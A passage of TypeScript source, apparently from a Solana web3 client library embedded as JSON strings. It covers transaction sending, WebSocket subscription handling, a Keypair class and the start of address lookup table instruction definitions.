transaction.recentBlockhash = latestBlockhash.blockhash;\n        transaction.sign(...signers);\n        if (!transaction.signature) {\n          throw new Error('!signature'); // should never happen\n        }\n\n        const signature = transaction.signature.toString('base64');\n        if (!this._blockhashInfo.transactionSignatures.includes(signature)) {\n          // The signature of this transaction has not been seen before with the\n          // current recentBlockhash, all done. Let's break\n          this._blockhashInfo.transactionSignatures.push(signature);\n          break;\n        } else {\n          // This transaction would be treated as duplicate (its derived signature\n          // matched to one of already recorded signatures).\n          // So, we must fetch a new blockhash for a different signature by disabling\n          // our cache not to wait for the cache expiration (BLOCKHASH_CACHE_TIMEOUT_MS).\n          disableCache = true;\n        }\n      }\n    }\n\n    const wireTransaction = transaction.serialize();\n    return await this.sendRawTransaction(wireTransaction, options);\n  }\n\n  /**\n   * Send a transaction that has already been signed and serialized into the\n   * wire format\n   */\n  async sendRawTransaction(\n    rawTransaction: Buffer | Uint8Array | Array<number>,\n    options?: SendOptions,\n  ): Promise<TransactionSignature> {\n    const encodedTransaction = toBuffer(rawTransaction).toString('base64');\n    const result = await this.sendEncodedTransaction(\n      encodedTransaction,\n      options,\n    );\n    return result;\n  }\n\n  /**\n   * Send a transaction that has already been signed, serialized into the\n   * wire format, and encoded as a base64 string\n   */\n  async sendEncodedTransaction(\n    encodedTransaction: string,\n    options?: SendOptions,\n  ): Promise<TransactionSignature> {\n    const config: any = {encoding: 'base64'};\n    const skipPreflight = options && options.skipPreflight;\n    const preflightCommitment =\n      skipPreflight === true\n        ? 'processed' // FIXME Remove when https://github.com/anza-xyz/agave/pull/483 is deployed.\n        : (options && options.preflightCommitment) || this.commitment;\n\n    if (options && options.maxRetries != null) {\n      config.maxRetries = options.maxRetries;\n    }\n    if (options && options.minContextSlot != null) {\n      config.minContextSlot = options.minContextSlot;\n    }\n    if (skipPreflight) {\n      config.skipPreflight = skipPreflight;\n    }\n    if (preflightCommitment) {\n      config.preflightCommitment = preflightCommitment;\n    }\n\n    const args = [encodedTransaction, config];\n    const unsafeRes = await this._rpcRequest('sendTransaction', args);\n    const res = create(unsafeRes, SendTransactionRpcResult);\n    if ('error' in res) {\n      let logs = undefined;\n      if ('data' in res.error) {\n        logs = res.error.data.logs;\n      }\n\n      throw new SendTransactionError({\n        action: skipPreflight ? 'send' : 'simulate',\n        signature: '',\n        transactionMessage: res.error.message,\n        logs: logs,\n      });\n    }\n    return res.result;\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnOpen() {\n    this._rpcWebSocketConnected = true;\n    this._rpcWebSocketHeartbeat = setInterval(() => {\n      // Ping server every 5s to prevent idle timeouts\n      (async () => {\n        try {\n          await this._rpcWebSocket.notify('ping');\n          // eslint-disable-next-line no-empty\n        } catch {}\n      })();\n    }, 5000);\n    this._updateSubscriptions();\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnError(err: Error) {\n    this._rpcWebSocketConnected = false;\n    console.error('ws error:', err.message);\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnClose(code: number) {\n    this._rpcWebSocketConnected = false;\n    this._rpcWebSocketGeneration =\n      (this._rpcWebSocketGeneration + 1) % Number.MAX_SAFE_INTEGER;\n    if (this._rpcWebSocketIdleTimeout) {\n      clearTimeout(this._rpcWebSocketIdleTimeout);\n      this._rpcWebSocketIdleTimeout = null;\n    }\n    if (this._rpcWebSocketHeartbeat) {\n      clearInterval(this._rpcWebSocketHeartbeat);\n      this._rpcWebSocketHeartbeat = null;\n    }\n\n    if (code === 1000) {\n      // explicit close, check if any subscriptions have been made since close\n      this._updateSubscriptions();\n      return;\n    }\n\n    // implicit close, prepare subscriptions for auto-reconnect\n    this._subscriptionCallbacksByServerSubscriptionId = {};\n    Object.entries(\n      this._subscriptionsByHash as Record<SubscriptionConfigHash, Subscription>,\n    ).forEach(([hash, subscription]) => {\n      this._setSubscription(hash, {\n        ...subscription,\n        state: 'pending',\n      });\n    });\n  }\n\n  /**\n   * @internal\n   */\n  private _setSubscription(\n    hash: SubscriptionConfigHash,\n    nextSubscription: Subscription,\n  ) {\n    const prevState = this._subscriptionsByHash[hash]?.state;\n    this._subscriptionsByHash[hash] = nextSubscription;\n    if (prevState !== nextSubscription.state) {\n      const stateChangeCallbacks =\n        this._subscriptionStateChangeCallbacksByHash[hash];\n      if (stateChangeCallbacks) {\n        stateChangeCallbacks.forEach(cb => {\n          try {\n            cb(nextSubscription.state);\n            // eslint-disable-next-line no-empty\n          } catch {}\n        });\n      }\n    }\n  }\n\n  /**\n   * @internal\n   */\n  private _onSubscriptionStateChange(\n    clientSubscriptionId: ClientSubscriptionId,\n    callback: SubscriptionStateChangeCallback,\n  ): SubscriptionStateChangeDisposeFn {\n    const hash =\n      this._subscriptionHashByClientSubscriptionId[clientSubscriptionId];\n    if (hash == null) {\n      return () => {};\n    }\n    const stateChangeCallbacks = (this._subscriptionStateChangeCallbacksByHash[\n      hash\n    ] ||= new Set());\n    stateChangeCallbacks.add(callback);\n    return () => {\n      stateChangeCallbacks.delete(callback);\n      if (stateChangeCallbacks.size === 0) {\n        delete this._subscriptionStateChangeCallbacksByHash[hash];\n      }\n    };\n  }\n\n  /**\n   * @internal\n   */\n  async _updateSubscriptions() {\n    if (Object.keys(this._subscriptionsByHash).length === 0) {\n      if (this._rpcWebSocketConnected) {\n        this._rpcWebSocketConnected = false;\n        this._rpcWebSocketIdleTimeout = setTimeout(() => {\n          this._rpcWebSocketIdleTimeout = null;\n          try {\n            this._rpcWebSocket.close();\n          } catch (err) {\n            // swallow error if socket has already been closed.\n            if (err instanceof Error) {\n              console.log(\n                `Error when closing socket connection: ${err.message}`,\n              );\n            }\n          }\n        }, 500);\n      }\n      return;\n    }\n\n    if (this._rpcWebSocketIdleTimeout !== null) {\n      clearTimeout(this._rpcWebSocketIdleTimeout);\n      this._rpcWebSocketIdleTimeout = null;\n      this._rpcWebSocketConnected = true;\n    }\n\n    if (!this._rpcWebSocketConnected) {\n      this._rpcWebSocket.connect();\n      return;\n    }\n\n    const activeWebSocketGeneration = this._rpcWebSocketGeneration;\n    const isCurrentConnectionStillActive = () => {\n      return activeWebSocketGeneration === this._rpcWebSocketGeneration;\n    };\n\n    await Promise.all(\n      // Don't be tempted to change this to `Object.entries`. We call\n      // `_updateSubscriptions` recursively when processing the state,\n      // so it's important that we look up the *current* version of\n      // each subscription, every time we process a hash.\n      Object.keys(this._subscriptionsByHash).map(async hash => {\n        const subscription = this._subscriptionsByHash[hash];\n        if (subscription === undefined) {\n          // This entry has since been deleted. Skip.\n          return;\n        }\n        switch (subscription.state) {\n          case 'pending':\n          case 'unsubscribed':\n            if (subscription.callbacks.size === 0) {\n              /**\n               * You can end up here when:\n               *\n               * - a subscription has recently unsubscribed\n               *   without having new callbacks added to it\n               *   while the unsubscribe was in flight, or\n               * - when a pending subscription has its\n               *   listeners removed before a request was\n               *   sent to the server.\n               *\n               * Being that nobody is interested in this\n               * subscription any longer, delete it.\n               */\n              delete this._subscriptionsByHash[hash];\n              if (subscription.state === 'unsubscribed') {\n                delete this._subscriptionCallbacksByServerSubscriptionId[\n                  subscription.serverSubscriptionId\n                ];\n              }\n              await this._updateSubscriptions();\n              return;\n            }\n            await (async () => {\n              const {args, method} = subscription;\n              try {\n                this._setSubscription(hash, {\n                  ...subscription,\n                  state: 'subscribing',\n                });\n                const serverSubscriptionId: ServerSubscriptionId =\n                  (await this._rpcWebSocket.call(method, args)) as number;\n                this._setSubscription(hash, {\n                  ...subscription,\n                  serverSubscriptionId,\n                  state: 'subscribed',\n                });\n                this._subscriptionCallbacksByServerSubscriptionId[\n                  serverSubscriptionId\n                ] = subscription.callbacks;\n                await this._updateSubscriptions();\n              } catch (e) {\n                console.error(\n                  `Received ${e instanceof Error ? '' : 'JSON-RPC '}error calling \\`${method}\\``,\n                  {\n                    args,\n                    error: e,\n                  },\n                );\n                if (!isCurrentConnectionStillActive()) {\n                  return;\n                }\n                // TODO: Maybe add an 'errored' state or a retry limit?\n                this._setSubscription(hash, {\n                  ...subscription,\n                  state: 'pending',\n                });\n                await this._updateSubscriptions();\n              }\n            })();\n            break;\n          case 'subscribed':\n            if (subscription.callbacks.size === 0) {\n              // By the time we successfully set up a subscription\n              // with the server, the client stopped caring about it.\n              // Tear it down now.\n              await (async () => {\n                const {serverSubscriptionId, unsubscribeMethod} = subscription;\n                if (\n                  this._subscriptionsAutoDisposedByRpc.has(serverSubscriptionId)\n                ) {\n                  /**\n                   * Special case.\n                   * If we're dealing with a subscription that has been auto-\n                   * disposed by the RPC, then we can skip the RPC call to\n                   * tear down the subscription here.\n                   *\n                   * NOTE: There is a proposal to eliminate this special case, here:\n                   * https://github.com/solana-labs/solana/issues/18892\n                   */\n                  this._subscriptionsAutoDisposedByRpc.delete(\n                    serverSubscriptionId,\n                  );\n                } else {\n                  this._setSubscription(hash, {\n                    ...subscription,\n                    state: 'unsubscribing',\n                  });\n                  this._setSubscription(hash, {\n                    ...subscription,\n                    state: 'unsubscribing',\n                  });\n                  try {\n                    await this._rpcWebSocket.call(unsubscribeMethod, [\n                      serverSubscriptionId,\n                    ]);\n                  } catch (e) {\n                    if (e instanceof Error) {\n                      console.error(`${unsubscribeMethod} error:`, e.message);\n                    }\n                    if (!isCurrentConnectionStillActive()) {\n                      return;\n                    }\n                    // TODO: Maybe add an 'errored' state or a retry limit?\n                    this._setSubscription(hash, {\n                      ...subscription,\n                      state: 'subscribed',\n                    });\n                    await this._updateSubscriptions();\n                    return;\n                  }\n                }\n                this._setSubscription(hash, {\n                  ...subscription,\n                  state: 'unsubscribed',\n                });\n                await this._updateSubscriptions();\n              })();\n            }\n            break;\n          case 'subscribing':\n          case 'unsubscribing':\n            break;\n        }\n      }),\n    );\n  }\n\n  /**\n   * @internal\n   */\n  private _handleServerNotification<\n    TCallback extends SubscriptionConfig['callback'],\n  >(\n    serverSubscriptionId: ServerSubscriptionId,\n    callbackArgs: Parameters<TCallback>,\n  ): void {\n    const callbacks =\n      this._subscriptionCallbacksByServerSubscriptionId[serverSubscriptionId];\n    if (callbacks === undefined) {\n      return;\n    }\n    callbacks.forEach(cb => {\n      try {\n        cb(\n          // I failed to find a way to convince TypeScript that `cb` is of type\n          // `TCallback` which is certainly compatible with `Parameters<TCallback>`.\n          // See https://github.com/microsoft/TypeScript/issues/47615\n          // @ts-ignore\n          ...callbackArgs,\n        );\n      } catch (e) {\n        console.error(e);\n      }\n    });\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnAccountNotification(notification: object) {\n    const {result, subscription} = create(\n      notification,\n      AccountNotificationResult,\n    );\n    this._handleServerNotification<AccountChangeCallback>(subscription, [\n      result.value,\n      result.context,\n    ]);\n  }\n\n  /**\n   * @internal\n   */\n  private _makeSubscription(\n    subscriptionConfig: SubscriptionConfig,\n    /**\n     * When preparing `args` for a call to `_makeSubscription`, be sure\n     * to carefully apply a default `commitment` property, if necessary.\n     *\n     * - If the user supplied a `commitment` use that.\n     * - Otherwise, if the `Connection::commitment` is set, use that.\n     * - Otherwise, set it to the RPC server default: `finalized`.\n     *\n     * This is extremely important to ensure that these two fundamentally\n     * identical subscriptions produce the same identifying hash:\n     *\n     * - A subscription made without specifying a commitment.\n     * - A subscription made where the commitment specified is the same\n     *   as the default applied to the subscription above.\n     *\n     * Example; these two subscriptions must produce the same hash:\n     *\n     * - An `accountSubscribe` subscription for `'PUBKEY'`\n     * - An `accountSubscribe` subscription for `'PUBKEY'` with commitment\n     *   `'finalized'`.\n     *\n     * See the 'making a subscription with defaulted params omitted' test\n     * in `connection-subscriptions.ts` for more.\n     */\n    args: IWSRequestParams,\n  ): ClientSubscriptionId {\n    const clientSubscriptionId = this._nextClientSubscriptionId++;\n    const hash = fastStableStringify([subscriptionConfig.method, args]);\n    const existingSubscription = this._subscriptionsByHash[hash];\n    if (existingSubscription === undefined) {\n      this._subscriptionsByHash[hash] = {\n        ...subscriptionConfig,\n        args,\n        callbacks: new Set([subscriptionConfig.callback]),\n        state: 'pending',\n      };\n    } else {\n      existingSubscription.callbacks.add(subscriptionConfig.callback);\n    }\n    this._subscriptionHashByClientSubscriptionId[clientSubscriptionId] = hash;\n    this._subscriptionDisposeFunctionsByClientSubscriptionId[\n      clientSubscriptionId\n    ] = async () => {\n      delete this._subscriptionDisposeFunctionsByClientSubscriptionId[\n        clientSubscriptionId\n      ];\n      delete this._subscriptionHashByClientSubscriptionId[clientSubscriptionId];\n      const subscription = this._subscriptionsByHash[hash];\n      assert(\n        subscription !== undefined,\n        `Could not find a \\`Subscription\\` when tearing down client subscription #${clientSubscriptionId}`,\n      );\n      subscription.callbacks.delete(subscriptionConfig.callback);\n      await this._updateSubscriptions();\n    };\n    this._updateSubscriptions();\n    return clientSubscriptionId;\n  }\n\n  /**\n   * Register a callback to be invoked whenever the specified account changes\n   *\n   * @param publicKey Public key of the account to monitor\n   * @param callback Function to invoke whenever the account is changed\n   * @param config\n   * @return subscription id\n   */\n  onAccountChange(\n    publicKey: PublicKey,\n    callback: AccountChangeCallback,\n    config?: AccountSubscriptionConfig,\n  ): ClientSubscriptionId;\n  /** @deprecated Instead, pass in an {@link AccountSubscriptionConfig} */\n  // eslint-disable-next-line no-dupe-class-members\n  onAccountChange(\n    publicKey: PublicKey,\n    callback: AccountChangeCallback,\n    commitment?: Commitment,\n  ): ClientSubscriptionId;\n  // eslint-disable-next-line no-dupe-class-members\n  onAccountChange(\n    publicKey: PublicKey,\n    callback: AccountChangeCallback,\n    commitmentOrConfig?: Commitment | AccountSubscriptionConfig,\n  ): ClientSubscriptionId {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [publicKey.toBase58()],\n      commitment || this._commitment || 'finalized', // Apply connection/server default.\n      'base64',\n      config,\n    );\n    return this._makeSubscription(\n      {\n        callback,\n        method: 'accountSubscribe',\n        unsubscribeMethod: 'accountUnsubscribe',\n      },\n      args,\n    );\n  }\n\n  /**\n   * Deregister an account notification callback\n   *\n   * @param clientSubscriptionId client subscription id to deregister\n   */\n  async removeAccountChangeListener(\n    clientSubscriptionId: ClientSubscriptionId,\n  ): Promise<void> {\n    await this._unsubscribeClientSubscription(\n      clientSubscriptionId,\n      'account change',\n    );\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnProgramAccountNotification(notification: Object) {\n    const {result, subscription} = create(\n      notification,\n      ProgramAccountNotificationResult,\n    );\n    this._handleServerNotification<ProgramAccountChangeCallback>(subscription, [\n      {\n        accountId: result.value.pubkey,\n        accountInfo: result.value.account,\n      },\n      result.context,\n    ]);\n  }\n\n  /**\n   * Register a callback to be invoked whenever accounts owned by the\n   * specified program change\n   *\n   * @param programId Public key of the program to monitor\n   * @param callback Function to invoke whenever the account is changed\n   * @param config\n   * @return subscription id\n   */\n  onProgramAccountChange(\n    programId: PublicKey,\n    callback: ProgramAccountChangeCallback,\n    config?: ProgramAccountSubscriptionConfig,\n  ): ClientSubscriptionId;\n  /** @deprecated Instead, pass in a {@link ProgramAccountSubscriptionConfig} */\n  // eslint-disable-next-line no-dupe-class-members\n  onProgramAccountChange(\n    programId: PublicKey,\n    callback: ProgramAccountChangeCallback,\n    commitment?: Commitment,\n    filters?: GetProgramAccountsFilter[],\n  ): ClientSubscriptionId;\n  // eslint-disable-next-line no-dupe-class-members\n  onProgramAccountChange(\n    programId: PublicKey,\n    callback: ProgramAccountChangeCallback,\n    commitmentOrConfig?: Commitment | ProgramAccountSubscriptionConfig,\n    maybeFilters?: GetProgramAccountsFilter[],\n  ): ClientSubscriptionId {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [programId.toBase58()],\n      commitment || this._commitment || 'finalized', // Apply connection/server default.\n      'base64' /* encoding */,\n      config\n        ? config\n        : maybeFilters\n          ? {filters: applyDefaultMemcmpEncodingToFilters(maybeFilters)}\n          : undefined /* extra */,\n    );\n    return this._makeSubscription(\n      {\n        callback,\n        method: 'programSubscribe',\n        unsubscribeMethod: 'programUnsubscribe',\n      },\n      args,\n    );\n  }\n\n  /**\n   * Deregister an account notification callback\n   *\n   * @param clientSubscriptionId client subscription id to deregister\n   */\n  async removeProgramAccountChangeListener(\n    clientSubscriptionId: ClientSubscriptionId,\n  ): Promise<void> {\n    await this._unsubscribeClientSubscription(\n      clientSubscriptionId,\n      'program account change',\n    );\n  }\n\n  /**\n   * Registers a callback to be invoked whenever logs are emitted.\n   */\n  onLogs(\n    filter: LogsFilter,\n    callback: LogsCallback,\n    commitment?: Commitment,\n  ): ClientSubscriptionId {\n    const args = this._buildArgs(\n      [typeof filter === 'object' ? {mentions: [filter.toString()]} : filter],\n      commitment || this._commitment || 'finalized', // Apply connection/server default.\n    );\n    return this._makeSubscription(\n      {\n        callback,\n        method: 'logsSubscribe',\n        unsubscribeMethod: 'logsUnsubscribe',\n      },\n      args,\n    );\n  }\n\n  /**\n   * Deregister a logs callback.\n   *\n   * @param clientSubscriptionId client subscription id to deregister.\n   */\n  async removeOnLogsListener(\n    clientSubscriptionId: ClientSubscriptionId,\n  ): Promise<void> {\n    await this._unsubscribeClientSubscription(clientSubscriptionId, 'logs');\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnLogsNotification(notification: Object) {\n    const {result, subscription} = create(notification, LogsNotificationResult);\n    this._handleServerNotification<LogsCallback>(subscription, [\n      result.value,\n      result.context,\n    ]);\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnSlotNotification(notification: Object) {\n    const {result, subscription} = create(notification, SlotNotificationResult);\n    this._handleServerNotification<SlotChangeCallback>(subscription, [result]);\n  }\n\n  /**\n   * Register a callback to be invoked upon slot changes\n   *\n   * @param callback Function to invoke whenever the slot changes\n   * @return subscription id\n   */\n  onSlotChange(callback: SlotChangeCallback): ClientSubscriptionId {\n    return this._makeSubscription(\n      {\n        callback,\n        method: 'slotSubscribe',\n        unsubscribeMethod: 'slotUnsubscribe',\n      },\n      [] /* args */,\n    );\n  }\n\n  /**\n   * Deregister a slot notification callback\n   *\n   * @param clientSubscriptionId client subscription id to deregister\n   */\n  async removeSlotChangeListener(\n    clientSubscriptionId: ClientSubscriptionId,\n  ): Promise<void> {\n    await this._unsubscribeClientSubscription(\n      clientSubscriptionId,\n      'slot change',\n    );\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnSlotUpdatesNotification(notification: Object) {\n    const {result, subscription} = create(\n      notification,\n      SlotUpdateNotificationResult,\n    );\n    this._handleServerNotification<SlotUpdateCallback>(subscription, [result]);\n  }\n\n  /**\n   * Register a callback to be invoked upon slot updates. {@link SlotUpdate}'s\n   * may be useful to track live progress of a cluster.\n   *\n   * @param callback Function to invoke whenever the slot updates\n   * @return subscription id\n   */\n  onSlotUpdate(callback: SlotUpdateCallback): ClientSubscriptionId {\n    return this._makeSubscription(\n      {\n        callback,\n        method: 'slotsUpdatesSubscribe',\n        unsubscribeMethod: 'slotsUpdatesUnsubscribe',\n      },\n      [] /* args */,\n    );\n  }\n\n  /**\n   * Deregister a slot update notification callback\n   *\n   * @param clientSubscriptionId client subscription id to deregister\n   */\n  async removeSlotUpdateListener(\n    clientSubscriptionId: ClientSubscriptionId,\n  ): Promise<void> {\n    await this._unsubscribeClientSubscription(\n      clientSubscriptionId,\n      'slot update',\n    );\n  }\n\n  /**\n   * @internal\n   */\n\n  private async _unsubscribeClientSubscription(\n    clientSubscriptionId: ClientSubscriptionId,\n    subscriptionName: string,\n  ) {\n    const dispose =\n      this._subscriptionDisposeFunctionsByClientSubscriptionId[\n        clientSubscriptionId\n      ];\n    if (dispose) {\n      await dispose();\n    } else {\n      console.warn(\n        'Ignored unsubscribe request because an active subscription with id ' +\n          `\\`${clientSubscriptionId}\\` for '${subscriptionName}' events ` +\n          'could not be found.',\n      );\n    }\n  }\n\n  _buildArgs(\n    args: Array<any>,\n    override?: Commitment,\n    encoding?: 'jsonParsed' | 'base64',\n    extra?: any,\n  ): Array<any> {\n    const commitment = override || this._commitment;\n    if (commitment || encoding || extra) {\n      let options: any = {};\n      if (encoding) {\n        options.encoding = encoding;\n      }\n      if (commitment) {\n        options.commitment = commitment;\n      }\n      if (extra) {\n        options = Object.assign(options, extra);\n      }\n      args.push(options);\n    }\n    return args;\n  }\n\n  /**\n   * @internal\n   */\n  _buildArgsAtLeastConfirmed(\n    args: Array<any>,\n    override?: Finality,\n    encoding?: 'jsonParsed' | 'base64',\n    extra?: any,\n  ): Array<any> {\n    const commitment = override || this._commitment;\n    if (commitment && !['confirmed', 'finalized'].includes(commitment)) {\n      throw new Error(\n        'Using Connection with default commitment: `' +\n          this._commitment +\n          '`, but method requires at least `confirmed`',\n      );\n    }\n    return this._buildArgs(args, override, encoding, extra);\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnSignatureNotification(notification: Object) {\n    const {result, subscription} = create(\n      notification,\n      SignatureNotificationResult,\n    );\n    if (result.value !== 'receivedSignature') {\n      /**\n       * Special case.\n       * After a signature is processed, RPCs automatically dispose of the\n       * subscription on the server side. We need to track which of these\n       * subscriptions have been disposed in such a way, so that we know\n       * whether the client is dealing with a not-yet-processed signature\n       * (in which case we must tear down the server subscription) or an\n       * already-processed signature (in which case the client can simply\n       * clear out the subscription locally without telling the server).\n       *\n       * NOTE: There is a proposal to eliminate this special case, here:\n       * https://github.com/solana-labs/solana/issues/18892\n       */\n      this._subscriptionsAutoDisposedByRpc.add(subscription);\n    }\n    this._handleServerNotification<SignatureSubscriptionCallback>(\n      subscription,\n      result.value === 'receivedSignature'\n        ? [{type: 'received'}, result.context]\n        : [{type: 'status', result: result.value}, result.context],\n    );\n  }\n\n  /**\n   * Register a callback to be invoked upon signature updates\n   *\n   * @param signature Transaction signature string in base 58\n   * @param callback Function to invoke on signature notifications\n   * @param commitment Specify the commitment level signature must reach before notification\n   * @return subscription id\n   */\n  onSignature(\n    signature: TransactionSignature,\n    callback: SignatureResultCallback,\n    commitment?: Commitment,\n  ): ClientSubscriptionId {\n    const args = this._buildArgs(\n      [signature],\n      commitment || this._commitment || 'finalized', // Apply connection/server default.\n    );\n    const clientSubscriptionId = this._makeSubscription(\n      {\n        callback: (notification, context) => {\n          if (notification.type === 'status') {\n            callback(notification.result, context);\n            // Signatures subscriptions are auto-removed by the RPC service\n            // so no need to explicitly send an unsubscribe message.\n            try {\n              this.removeSignatureListener(clientSubscriptionId);\n              // eslint-disable-next-line no-empty\n            } catch (_err) {\n              // Already removed.\n            }\n          }\n        },\n        method: 'signatureSubscribe',\n        unsubscribeMethod: 'signatureUnsubscribe',\n      },\n      args,\n    );\n    return clientSubscriptionId;\n  }\n\n  /**\n   * Register a callback to be invoked when a transaction is\n   * received and/or processed.\n   *\n   * @param signature Transaction signature string in base 58\n   * @param callback Function to invoke on signature notifications\n   * @param options Enable received notifications and set the commitment\n   *   level that signature must reach before notification\n   * @return subscription id\n   */\n  onSignatureWithOptions(\n    signature: TransactionSignature,\n    callback: SignatureSubscriptionCallback,\n    options?: SignatureSubscriptionOptions,\n  ): ClientSubscriptionId {\n    const {commitment, ...extra} = {\n      ...options,\n      commitment:\n        (options && options.commitment) || this._commitment || 'finalized', // Apply connection/server default.\n    };\n    const args = this._buildArgs(\n      [signature],\n      commitment,\n      undefined /* encoding */,\n      extra,\n    );\n    const clientSubscriptionId = this._makeSubscription(\n      {\n        callback: (notification, context) => {\n          callback(notification, context);\n          // Signatures subscriptions are auto-removed by the RPC service\n          // so no need to explicitly send an unsubscribe message.\n          try {\n            this.removeSignatureListener(clientSubscriptionId);\n            // eslint-disable-next-line no-empty\n          } catch (_err) {\n            // Already removed.\n          }\n        },\n        method: 'signatureSubscribe',\n        unsubscribeMethod: 'signatureUnsubscribe',\n      },\n      args,\n    );\n    return clientSubscriptionId;\n  }\n\n  /**\n   * Deregister a signature notification callback\n   *\n   * @param clientSubscriptionId client subscription id to deregister\n   */\n  async removeSignatureListener(\n    clientSubscriptionId: ClientSubscriptionId,\n  ): Promise<void> {\n    await this._unsubscribeClientSubscription(\n      clientSubscriptionId,\n      'signature result',\n    );\n  }\n\n  /**\n   * @internal\n   */\n  _wsOnRootNotification(notification: Object) {\n    const {result, subscription} = create(notification, RootNotificationResult);\n    this._handleServerNotification<RootChangeCallback>(subscription, [result]);\n  }\n\n  /**\n   * Register a callback to be invoked upon root changes\n   *\n   * @param callback Function to invoke whenever the root changes\n   * @return subscription id\n   */\n  onRootChange(callback: RootChangeCallback): ClientSubscriptionId {\n    return this._makeSubscription(\n      {\n        callback,\n        method: 'rootSubscribe',\n        unsubscribeMethod: 'rootUnsubscribe',\n      },\n      [] /* args */,\n    );\n  }\n\n  /**\n   * Deregister a root notification callback\n   *\n   * @param clientSubscriptionId client subscription id to deregister\n   */\n  async removeRootChangeListener(\n    clientSubscriptionId: ClientSubscriptionId,\n  ): Promise<void> {\n    await this._unsubscribeClientSubscription(\n      clientSubscriptionId,\n      'root change',\n    );\n  }\n}\n","import {generateKeypair, getPublicKey, Ed25519Keypair} from './utils/ed25519';\nimport {PublicKey} from './publickey';\n\n/**\n * Keypair signer interface\n */\nexport interface Signer {\n  publicKey: PublicKey;\n  secretKey: Uint8Array;\n}\n\n/**\n * An account keypair used for signing transactions.\n */\nexport class Keypair {\n  private _keypair: Ed25519Keypair;\n\n  /**\n   * Create a new keypair instance.\n   * Generate random keypair if no {@link Ed25519Keypair} is provided.\n   *\n   * @param {Ed25519Keypair} keypair ed25519 keypair\n   */\n  constructor(keypair?: Ed25519Keypair) {\n    this._keypair = keypair ?? generateKeypair();\n  }\n\n  /**\n   * Generate a new random keypair\n   *\n   * @returns {Keypair} Keypair\n   */\n  static generate(): Keypair {\n    return new Keypair(generateKeypair());\n  }\n\n  /**\n   * Create a keypair from a raw secret key byte array.\n   *\n   * This method should only be used to recreate a keypair from a previously\n   * generated secret key. Generating keypairs from a random seed should be done\n   * with the {@link Keypair.fromSeed} method.\n   *\n   * @throws error if the provided secret key is invalid and validation is not skipped.\n   *\n   * @param secretKey secret key byte array\n   * @param options skip secret key validation\n   *\n   * @returns {Keypair} Keypair\n   */\n  static fromSecretKey(\n    secretKey: Uint8Array,\n    options?: {skipValidation?: boolean},\n  ): Keypair {\n    if (secretKey.byteLength !== 64) {\n      throw new Error('bad secret key size');\n    }\n    const publicKey = secretKey.slice(32, 64);\n    if (!options || !options.skipValidation) {\n      const privateScalar = secretKey.slice(0, 32);\n      const computedPublicKey = getPublicKey(privateScalar);\n      for (let ii = 0; ii < 32; ii++) {\n        if (publicKey[ii] !== computedPublicKey[ii]) {\n          throw new Error('provided secretKey is invalid');\n        }\n      }\n    }\n    return new Keypair({publicKey, secretKey});\n  }\n\n  /**\n   * Generate a keypair from a 32 byte seed.\n   *\n   * @param seed seed byte array\n   *\n   * @returns {Keypair} Keypair\n   */\n  static fromSeed(seed: Uint8Array): Keypair {\n    const publicKey = getPublicKey(seed);\n    const secretKey = new Uint8Array(64);\n    secretKey.set(seed);\n    secretKey.set(publicKey, 32);\n    return new Keypair({publicKey, secretKey});\n  }\n\n  /**\n   * The public key for this keypair\n   *\n   * @returns {PublicKey} PublicKey\n   */\n  get publicKey(): PublicKey {\n    return new PublicKey(this._keypair.publicKey);\n  }\n\n  /**\n   * The raw secret key for this keypair\n   * @returns {Uint8Array} Secret key in an array of Uint8 bytes\n   */\n  get secretKey(): Uint8Array {\n    return new Uint8Array(this._keypair.secretKey);\n  }\n}\n","import {toBufferLE} from 'bigint-buffer';\nimport * as BufferLayout from '@solana/buffer-layout';\n\nimport * as Layout from '../../layout';\nimport {PublicKey} from '../../publickey';\nimport * as bigintLayout from '../../utils/bigint';\nimport {SystemProgram} from '../system';\nimport {TransactionInstruction} from '../../transaction';\nimport {decodeData, encodeData, IInstructionInputData} from '../../instruction';\n\nexport * from './state';\n\nexport type CreateLookupTableParams = {\n  /** Account used to derive and control the new address lookup table. */\n  authority: PublicKey;\n  /** Account that will fund the new address lookup table. */\n  payer: PublicKey;\n  /** A recent slot must be used in the derivation path for each initialized table. */\n  recentSlot: bigint | number;\n};\n\nexport type FreezeLookupTableParams = {\n  /** Address lookup table account to freeze. */\n  lookupTable: PublicKey;\n  /** Account which is the current authority. */\n  authority: PublicKey;\n};\n\nexport type ExtendLookupTableParams = {\n  /** Address lookup table account to extend. */\n  lookupTable: PublicKey;\n  /** Account which is the current authority. */\n  authority: PublicKey;\n  /** Account that will fund the table reallocation.\n   * Not required if the reallocation has already been funded. */\n  payer?: PublicKey;\n  /** List of Public Keys to be added to the lookup table. */\n  addresses: Array<PublicKey>;\n};\n\nexport type DeactivateLookupTableParams = {\n  /** Address lookup table account to deactivate. */\n  lookupTable: PublicKey;\n  /** Account which is the current authority. */\n  authority: PublicKey;\n};\n\nexport type CloseLookupTableParams = {\n  /** Address lookup table account to close. */\n  lookupTable: PublicKey;\n  /** Account which is the current authority. */\n  authority: PublicKey;\n  /** Recipient of closed account lamports. */\n  recipient: PublicKey;\n};\n\n/**\n * An enumeration of valid LookupTableInstructionType's\n */\nexport type LookupTableInstructionType =\n  | 'CreateLookupTable'\n  | 'ExtendLookupTable'\n  | 'CloseLookupTable'\n  | 'FreezeLookupTable'\n  | 'DeactivateLookupTable';\n\ntype LookupTableInstructionInputData = {\n  CreateLookupTable: IInstructionInputData &\n    Readonly<{\n      recentSlot: bigint;\n      bumpSeed: number;\n    }>;\n  FreezeLookupTable: IInstructionInputData;\n  ExtendLookupTable: IInstructionInputData &\n    Readonly<{\n      numberOfAddresses: bigint;\n      addresses: Array<Uint8Array>;\n    }>;\n  DeactivateLookupTable: IInstructionInputData;\n  CloseLookupTable: IInstructionInputData;\n};\n\n/**\n * An enumeration of valid address lookup table InstructionType's\n * @internal\n */\nexport const LOOKUP_TABLE_INSTRUCTION_LAYOUTS = Object.freeze({\n  